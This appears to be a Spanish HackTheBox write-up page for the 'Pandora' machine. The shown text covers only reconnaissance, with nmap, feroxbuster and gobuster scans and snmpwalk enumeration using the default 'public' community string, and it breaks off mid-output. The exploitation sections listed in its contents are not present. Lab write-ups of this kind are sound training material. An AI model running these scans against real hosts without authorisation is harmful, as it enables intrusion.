@@ -1,0 +1,1291 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Pandora (easy) · MiguelRega7</title>
+<meta name="description" content="- Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service,"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Pandora (easy)</h1><div class="meta"><span>◷</span><time>2024-06-19</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service,.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#shell-as-daniel">Shell as daniel</a><a href="#local-port-forwarding">Local Port Forwarding</a><a href="#cve-2021-32099-unauthenticated-sql-injection">CVE-2021-32099 Unauthenticated SQL Injection</a><a href="#shell-as-matt">Shell as matt</a><a href="#user-flag">User flag</a><a href="#escalada-de-privilegios">Escalada de privilegios</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/6ac0e76002774bbfac92b0dbc86cb6af.png">
+</p>
+
+<ul>
+<li>Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user <code>daniel</code>. Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called <code>matt</code> is achieved by chaining SQL injection RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user <code>root</code> is performed by exploiting a SUID binary for PATH variable injection.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Escaneamos los puertos abiertos por el protocolo TCP y sus servicios que corren en los puertos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p22,80 10.10.11.136 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 12:59 CST
+Nmap scan report for 10.10.11.136
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Play | Landing
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Estas son las tecnologías que están corriendo en el puerto 80.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">➜  nmap whatweb http://10.10.11.136
+http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
+</code></pre></div></div>
+<ul>
+<li>Esta es la página web.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/1.png">
+</p>
+
+<ul>
+<li>Vamos a hacer <code>fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap feroxbuster -u http://10.10.11.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.136
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       35l      183w    14785c http://10.10.11.136/assets/images/testimonials/author-03.png
+200      GET        1l      111w     1965c http://10.10.11.136/assets/images/logo/logo.svg
+200      GET        1l      350w    10753c http://10.10.11.136/assets/images/brands/graygrids.svg
+200      GET       33l      171w    13994c http://10.10.11.136/assets/images/testimonials/author-01.png
+200      GET        1l      230w     6015c http://10.10.11.136/assets/images/footer/brands/lineicons.svg
+200      GET       27l      174w    14698c http://10.10.11.136/assets/images/testimonials/author-02.png
+200      GET        1l      730w     7340c http://10.10.11.136/assets/images/hero/dotted-shape.svg
+200      GET      234l      437w     4182c http://10.10.11.136/assets/css/animate.css
+200      GET        1l      609w     8493c http://10.10.11.136/assets/images/footer/shape-2.svg
+200      GET        9l       35w      429c http://10.10.11.136/assets/images/footer/shape-1.svg
+200      GET        9l       35w      474c http://10.10.11.136/assets/images/footer/shape-3.svg
+200      GET       27l       32w    48044c http://10.10.11.136/assets/css/ud-styles.css.map
+200      GET        4l       31w      380c http://10.10.11.136/assets/images/404/shape-1.svg
+200      GET        4l       31w      384c http://10.10.11.136/assets/images/404/shape-2.svg
+200      GET        1l      155w     1625c http://10.10.11.136/assets/images/404/dotted-shape.svg
+200      GET        1l       31w      622c http://10.10.11.136/assets/images/faq/shape.svg
+200      GET        1l      111w     1968c http://10.10.11.136/assets/images/logo/logo-2.svg
+200      GET        7l     1994w   162720c http://10.10.11.136/assets/css/bootstrap.min.css
+301      GET        9l       28w      313c http://10.10.11.136/assets =&gt; http://10.10.11.136/assets/
+200      GET        3l      148w     8157c http://10.10.11.136/assets/js/wow.min.js
+200      GET       78l      139w     1147c http://10.10.11.136/assets/scss/_about.scss
+200      GET       93l      254w     2626c http://10.10.11.136/assets/js/main.js
+200      GET      502l      801w     7736c http://10.10.11.136/assets/scss/_blog-details.scss
+200      GET      122l      211w     2138c http://10.10.11.136/assets/scss/_pricing.scss
+200      GET       29l       56w      536c http://10.10.11.136/assets/scss/ud-styles.scss
+200      GET      132l      223w     2004c http://10.10.11.136/assets/scss/_contact.scss
+200      GET       31l       82w      459c http://10.10.11.136/assets/scss/_default.scss
+200      GET      155l      241w     2354c http://10.10.11.136/assets/scss/_footer.scss
+200      GET       99l      175w     1471c http://10.10.11.136/assets/scss/_404.scss
+200      GET      297l      529w     5316c http://10.10.11.136/assets/scss/_header.scss
+200      GET      179l      282w     2711c http://10.10.11.136/assets/scss/_common.scss
+200      GET      106l      166w     1676c http://10.10.11.136/assets/scss/_testimonials.scss
+200      GET      138l      221w     2016c http://10.10.11.136/assets/scss/_hero.scss
+200      GET      110l      178w     1858c http://10.10.11.136/assets/scss/_features.scss
+200      GET       81l      131w     1226c http://10.10.11.136/assets/scss/_team.scss
+200      GET       97l      150w     1467c http://10.10.11.136/assets/scss/_blog.scss
+200      GET       73l      122w     1416c http://10.10.11.136/assets/scss/_mixin.scss
+200      GET      110l      174w     1783c http://10.10.11.136/assets/scss/_login.scss
+200      GET        7l     1019w    78468c http://10.10.11.136/assets/js/bootstrap.bundle.min.js
+200      GET      254l     1427w   113210c http://10.10.11.136/assets/fonts/LineIcons.woff2
+200      GET     2001l     7262w   150863c http://10.10.11.136/assets/fonts/LineIcons.ttf
+200      GET      327l     1717w   138665c http://10.10.11.136/assets/fonts/LineIcons.woff
+200      GET     2001l     7264w   151045c http://10.10.11.136/assets/fonts/LineIcons.eot
+200      GET        1l      339w     6616c http://10.10.11.136/assets/images/brands/uideck.svg
+200      GET        1l      224w    10862c http://10.10.11.136/assets/images/footer/brands/graygrids.svg
+200      GET        1l       77w     1328c http://10.10.11.136/assets/images/favicon.svg
+200      GET        1l      467w    11946c http://10.10.11.136/assets/images/brands/ecommerce-html.svg
+200      GET        1l       87w     1454c http://10.10.11.136/assets/images/brands/ayroui.svg
+200      GET        1l      339w     6613c http://10.10.11.136/assets/images/footer/brands/uideck.svg
+200      GET        1l      296w     5850c http://10.10.11.136/assets/images/brands/lineicons.svg
+200      GET        1l      343w    12105c http://10.10.11.136/assets/images/footer/brands/ecommerce-html.svg
+200      GET     2613l     5243w    49342c http://10.10.11.136/assets/css/ud-styles.css
+200      GET        1l      447w     7311c http://10.10.11.136/assets/images/hero/brand.svg
+200      GET        1l      436w     8716c http://10.10.11.136/assets/images/brands/tailwindtemplates.svg
+200      GET        1l       87w     1451c http://10.10.11.136/assets/images/footer/brands/ayroui.svg
+200      GET      907l     2081w    33560c http://10.10.11.136/index.html
+200      GET        1l       23w   205311c http://10.10.11.136/assets/images/hero/hero-image.svg
+200      GET     2210l     2818w    26978c http://10.10.11.136/assets/css/lineicons.css
+200      GET        0l        0w   263054c http://10.10.11.136/assets/images/about/about-image.svg
+200      GET      907l     2081w    33560c http://10.10.11.136/
+200      GET        1l       14w      206c http://10.10.11.136/assets/images/team/shape-2.svg
+200      GET        1l      514w     5303c http://10.10.11.136/assets/images/team/dotted-shape.svg
+200      GET        1l       63w      965c http://10.10.11.136/assets/images/blog/quote-bg.svg
+200      GET        1l       59w      931c http://10.10.11.136/assets/images/banner/banner-bg.svg
+200      GET       72l      384w    26960c http://10.10.11.136/assets/images/blog/article-author-01.png
+200      GET       22l       41w      444c http://10.10.11.136/assets/scss/_banner.scss
+200      GET       20l      133w    10610c http://10.10.11.136/assets/images/blog/author-01.png
+200      GET        1l      155w     1622c http://10.10.11.136/assets/images/blog/dotted-shape.svg
+200      GET       80l      414w    26651c http://10.10.11.136/assets/images/blog/article-author-04.png
+200      GET       58l      396w    24661c http://10.10.11.136/assets/images/blog/article-author-03.png
+200      GET       64l      372w    28012c http://10.10.11.136/assets/images/blog/article-author-02.png
+200      GET      225l     1315w   108072c http://10.10.11.136/assets/images/team/team-01.png
+200      GET      290l     1846w   119742c http://10.10.11.136/assets/images/blog/bannder-ad.png
+200      GET        8l       57w      455c http://10.10.11.136/assets/scss/_variables.scss
+200      GET      228l     1302w   102185c http://10.10.11.136/assets/images/team/team-02.png
+200      GET      177l     1156w    99288c http://10.10.11.136/assets/images/team/team-03.png
+200      GET      319l     1954w   151043c http://10.10.11.136/assets/images/blog/blog-03.jpg
+200      GET       81l      155w     1431c http://10.10.11.136/assets/scss/_faq.scss
+200      GET      230l     1276w   100315c http://10.10.11.136/assets/images/team/team-04.png
+200      GET      379l     2166w   162485c http://10.10.11.136/assets/images/blog/blog-01.jpg
+200      GET      592l     3151w   242515c http://10.10.11.136/assets/images/blog/blog-02.jpg
+200      GET     1616l    75767w   593511c http://10.10.11.136/assets/fonts/LineIcons.svg
+200      GET     6061l    33168w  2270905c http://10.10.11.136/assets/images/blog/blog-details-01.jpg
+</code></pre></div></div>
+<ul>
+<li>Bueno nada interesante ahora vamos a buscar subdominios.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap gobuster vhost -u http://10.10.11.136 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --no-error -t 80
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://10.10.11.136
+[+] Method:          GET
+[+] Threads:         80
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Progress: 114441 / 114442 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre></div></div>
+<ul>
+<li>Pues bueno no encontramos nada algo que podemos hacer es escanear los puertos abiertos pero por el protocolo UDP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap --open -sU --top-ports 100 -T5 -vvv -n --open 10.10.11.136 -oG udpPorts
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 13:19 CST
+Initiating Ping Scan at 13:19
+Scanning 10.10.11.136 [4 ports]
+Completed Ping Scan at 13:19, 0.13s elapsed (1 total hosts)
+Initiating UDP Scan at 13:19
+Scanning 10.10.11.136 [100 ports]
+Warning: 10.10.11.136 giving up on port because retransmission cap hit (2).
+Discovered open port 161/udp on 10.10.11.136
+</code></pre></div></div>
+<ul>
+<li>Solo tenemos 1 puerto abierto el cual corre el servicio <code>snmp</code> vamos a escanearlo para ver mas información sobre ese puerto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sUCV -p161 10.10.11.136 -oN UDPtargeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 13:21 CST
+Nmap scan report for 10.10.11.136
+Host is up (0.11s latency).
+
+Bug in snmp-win32-software: no string output.
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-interfaces:
+|   lo
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 10 Mbps
+|     Traffic stats: 365.41 Kb sent, 365.41 Kb received
+|   VMware VMXNET3 Ethernet Controller
+|     IP address: 10.10.11.136  Netmask: 255.255.254.0
+|     MAC address: 00:50:56:b0:de:f7 (VMware)
+|     Type: ethernetCsmacd  Speed: 4 Gbps
+|_    Traffic stats: 756.20 Mb sent, 99.77 Mb received
+| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
+|_  System uptime: 27m5.89s (162589 timeticks)
+| snmp-processes:
+|   1:
+|     Name: systemd
+|   2:
+|     Name: kthreadd
+|   3:
+|     Name: rcu_gp
+|   4:
+|     Name: rcu_par_gp
+|   5:
+|     Name: kworker/0:0-mm_percpu_wq
+|   6:
+|     Name: kworker/0:0H-kblockd
+|   9:
+|     Name: mm_percpu_wq
+|   10:
+|     Name: ksoftirqd/0
+|   11:
+|     Name: rcu_sched
+|   12:
+|     Name: migration/0
+|   13:
+|     Name: idle_inject/0
+|   14:
+|     Name: cpuhp/0
+|   15:
+|     Name: cpuhp/1
+|   16:
+|     Name: idle_inject/1
+|   17:
+|     Name: migration/1
+|   18:
+|     Name: ksoftirqd/1
+|   20:
+|     Name: kworker/1:0H-kblockd
+|   21:
+|     Name: kdevtmpfs
+|   22:
+|     Name: netns
+|   23:
+|     Name: rcu_tasks_kthre
+|   24:
+|     Name: kauditd
+|   25:
+|     Name: khungtaskd
+|   26:
+|     Name: oom_reaper
+|   27:
+|     Name: writeback
+|   28:
+|     Name: kcompactd0
+|   29:
+|     Name: ksmd
+|   30:
+|     Name: khugepaged
+|   77:
+|     Name: kintegrityd
+|   78:
+|     Name: kblockd
+|   79:
+|     Name: blkcg_punt_bio
+|   80:
+|     Name: tpm_dev_wq
+|   81:
+|     Name: ata_sff
+|   82:
+|     Name: md
+|   83:
+|     Name: edac-poller
+|   84:
+|     Name: devfreq_wq
+|   85:
+|     Name: watchdogd
+|   88:
+|     Name: kswapd0
+|   89:
+|     Name: ecryptfs-kthrea
+|   91:
+|     Name: kthrotld
+|   92:
+|     Name: irq/24-pciehp
+|   93:
+|     Name: irq/25-pciehp
+|   94:
+|     Name: irq/26-pciehp
+|   95:
+|     Name: irq/27-pciehp
+|   96:
+|     Name: irq/28-pciehp
+|   97:
+|     Name: irq/29-pciehp
+|   98:
+|     Name: irq/30-pciehp
+|   99:
+|     Name: irq/31-pciehp
+|   100:
+|     Name: irq/32-pciehp
+|   101:
+|     Name: irq/33-pciehp
+|   102:
+|     Name: irq/34-pciehp
+|   103:
+|     Name: irq/35-pciehp
+|   104:
+|     Name: irq/36-pciehp
+|   105:
+|     Name: irq/37-pciehp
+|   106:
+|     Name: irq/38-pciehp
+|   107:
+|     Name: irq/39-pciehp
+|   108:
+|     Name: irq/40-pciehp
+|   109:
+|     Name: irq/41-pciehp
+|   110:
+|     Name: irq/42-pciehp
+|   111:
+|     Name: irq/43-pciehp
+|   112:
+|     Name: irq/44-pciehp
+|   113:
+|     Name: irq/45-pciehp
+|   114:
+|     Name: irq/46-pciehp
+|   115:
+|     Name: irq/47-pciehp
+|   116:
+|     Name: irq/48-pciehp
+|   117:
+|     Name: irq/49-pciehp
+|   118:
+|     Name: irq/50-pciehp
+|   119:
+|     Name: irq/51-pciehp
+|   120:
+|     Name: irq/52-pciehp
+|   121:
+|     Name: irq/53-pciehp
+|   122:
+|     Name: irq/54-pciehp
+|   123:
+|     Name: irq/55-pciehp
+|   124:
+|     Name: acpi_thermal_pm
+|   125:
+|     Name: scsi_eh_0
+|   126:
+|     Name: scsi_tmf_0
+|   127:
+|     Name: scsi_eh_1
+|   128:
+|     Name: scsi_tmf_1
+|   130:
+|     Name: vfio-irqfd-clea
+|   131:
+|     Name: ipv6_addrconf
+|   141:
+|     Name: kstrp
+|   144:
+|     Name: kworker/u5:0
+|   157:
+|     Name: charger_manager
+|   202:
+|     Name: scsi_eh_2
+|   203:
+|     Name: scsi_tmf_2
+|   204:
+|     Name: scsi_eh_3
+|   205:
+|     Name: scsi_tmf_3
+|   206:
+|     Name: mpt_poll_0
+|   207:
+|     Name: cryptd
+|   215:
+|     Name: scsi_eh_4
+|   217:
+|     Name: scsi_tmf_4
+|   218:
+|     Name: mpt/0
+|   220:
+|     Name: scsi_eh_5
+|   224:
+|     Name: scsi_tmf_5
+|   225:
+|     Name: scsi_eh_6
+|   226:
+|     Name: scsi_tmf_6
+|   227:
+|     Name: scsi_eh_7
+|   228:
+|     Name: scsi_tmf_7
+|   232:
+|     Name: scsi_eh_8
+|   237:
+|     Name: scsi_tmf_8
+|   239:
+|     Name: scsi_eh_9
+|   240:
+|     Name: scsi_tmf_9
+|   241:
+|     Name: scsi_eh_10
+|   254:
+|     Name: scsi_tmf_10
+|   255:
+|     Name: scsi_eh_11
+|   256:
+|     Name: scsi_tmf_11
+|   257:
+|     Name: scsi_eh_12
+|   259:
+|     Name: kworker/1:3-events
+|   260:
+|     Name: scsi_tmf_12
+|   261:
+|     Name: scsi_eh_13
+|   262:
+|     Name: irq/16-vmwgfx
+|   263:
+|     Name: scsi_tmf_13
+|   264:
+|     Name: ttm_swap
+|   265:
+|     Name: scsi_eh_14
+|   266:
+|     Name: scsi_tmf_14
+|   267:
+|     Name: scsi_eh_15
+|   268:
+|     Name: scsi_tmf_15
+|   269:
+|     Name: scsi_eh_16
+|   270:
+|     Name: scsi_tmf_16
+|   271:
+|     Name: scsi_eh_17
+|   272:
+|     Name: scsi_tmf_17
+|   273:
+|     Name: scsi_eh_18
+|   274:
+|     Name: scsi_tmf_18
+|   275:
+|     Name: scsi_eh_19
+|   276:
+|     Name: scsi_tmf_19
+|   277:
+|     Name: scsi_eh_20
+|   278:
+|     Name: scsi_tmf_20
+|   279:
+|     Name: scsi_eh_21
+|   280:
+|     Name: scsi_tmf_21
+|   281:
+|     Name: scsi_eh_22
+|   282:
+|     Name: scsi_tmf_22
+|   283:
+|     Name: scsi_eh_23
+|   284:
+|     Name: scsi_tmf_23
+|   285:
+|     Name: scsi_eh_24
+|   286:
+|     Name: scsi_tmf_24
+|   287:
+|     Name: scsi_eh_25
+|   288:
+|     Name: scsi_tmf_25
+|   289:
+|     Name: scsi_eh_26
+|   290:
+|     Name: scsi_tmf_26
+|   291:
+|     Name: scsi_eh_27
+|   292:
+|     Name: scsi_tmf_27
+|   293:
+|     Name: scsi_eh_28
+|   294:
+|     Name: scsi_tmf_28
+|   295:
+|     Name: scsi_eh_29
+|   296:
+|     Name: scsi_tmf_29
+|   297:
+|     Name: scsi_eh_30
+|   298:
+|     Name: scsi_tmf_30
+|   299:
+|     Name: scsi_eh_31
+|   300:
+|     Name: scsi_tmf_31
+|   324:
+|     Name: kworker/u4:27-events_power_efficient
+|   329:
+|     Name: scsi_eh_32
+|   330:
+|     Name: scsi_tmf_32
+|   331:
+|     Name: kworker/1:1H-kblockd
+|   343:
+|     Name: kdmflush
+|   345:
+|     Name: kdmflush
+|   376:
+|     Name: raid5wq
+|   430:
+|     Name: kworker/0:1H-kblockd
+|   434:
+|     Name: jbd2/dm-0-8
+|   435:
+|     Name: ext4-rsv-conver
+|   489:
+|     Name: systemd-journal
+|   516:
+|     Name: systemd-udevd
+|   518:
+|     Name: systemd-network
+|   660:
+|     Name: kaluad
+|   661:
+|     Name: kmpath_rdacd
+|   662:
+|     Name: kmpathd
+|   663:
+|     Name: kmpath_handlerd
+|   664:
+|     Name: multipathd
+|   672:
+|     Name: jbd2/sda2-8
+|   673:
+|     Name: ext4-rsv-conver
+|   685:
+|     Name: systemd-resolve
+|   688:
+|     Name: systemd-timesyn
+|   704:
+|     Name: VGAuthService
+|   712:
+|     Name: vmtoolsd
+|   758:
+|     Name: accounts-daemon
+|   759:
+|     Name: dbus-daemon
+|   764:
+|     Name: irqbalance
+|   765:
+|     Name: networkd-dispat
+|   766:
+|     Name: rsyslogd
+|   767:
+|     Name: systemd-logind
+|   772:
+|     Name: udisksd
+|   790:
+|     Name: cron
+|   807:
+|     Name: cron
+|   829:
+|     Name: atd
+|   840:
+|     Name: sh
+|   845:
+|     Name: snmpd
+|   850:
+|     Name: sshd
+|   878:
+|     Name: agetty
+|   879:
+|     Name: kworker/0:6-rcu_gp
+|   928:
+|     Name: apache2
+|   960:
+|     Name: mysqld
+|   967:
+|     Name: polkitd
+|   1102:
+|     Name: host_check
+|   2831:
+|     Name: apache2
+|   3138:
+|     Name: kworker/1:0-events
+|   3287:
+|     Name: kworker/u4:0-events_power_efficient
+|   3429:
+|     Name: apache2
+|   3432:
+|     Name: apache2
+|   3479:
+|     Name: apache2
+|   3514:
+|     Name: apache2
+|   3524:
+|     Name: apache2
+|   3552:
+|     Name: apache2
+|   3579:
+|     Name: apache2
+|   5024:
+|     Name: apache2
+|   5066:
+|_    Name: apache2
+| snmp-info:
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 48fa95537765c36000000000
+|   snmpEngineBoots: 30
+|_  snmpEngineTime: 27m06s
+| snmp-netstat:
+|   TCP  0.0.0.0:22           0.0.0.0:0
+|   TCP  10.10.11.136:60648   1.1.1.1:53
+|   TCP  127.0.0.1:3306       0.0.0.0:0
+|   TCP  127.0.0.53:53        0.0.0.0:0
+|   UDP  0.0.0.0:161          *:*
+|_  UDP  127.0.0.53:53        *:*
+Service Info: Host: pandora
+</code></pre></div></div>
+<ul>
+<li><p>Vemos a enumerar este servicio <a href="https://www.paessler.com/es/it-explained/snmp">https://www.paessler.com/es/it-explained/snmp</a> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</a>.</p>
+</li>
+<li><p>Vamos a usar la herramienta <code>snmpwalk</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp</a>.</p>
+</li>
+<li><p>Para enumerar necesitamos saber una <code>community string</code> valida la mas conocida es <code>Public</code> podemos probar enumerando con ese nombre.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap snmpwalk -v2c -c public 10.10.11.136
+iso.3.6.1.2.1.1.1.0 = STRING: &quot;Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&quot;
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (209683) 0:34:56.83
+iso.3.6.1.2.1.1.4.0 = STRING: &quot;Daniel&quot;
+iso.3.6.1.2.1.1.5.0 = STRING: &quot;pandora&quot;
+iso.3.6.1.2.1.1.6.0 = STRING: &quot;Mississippi&quot;
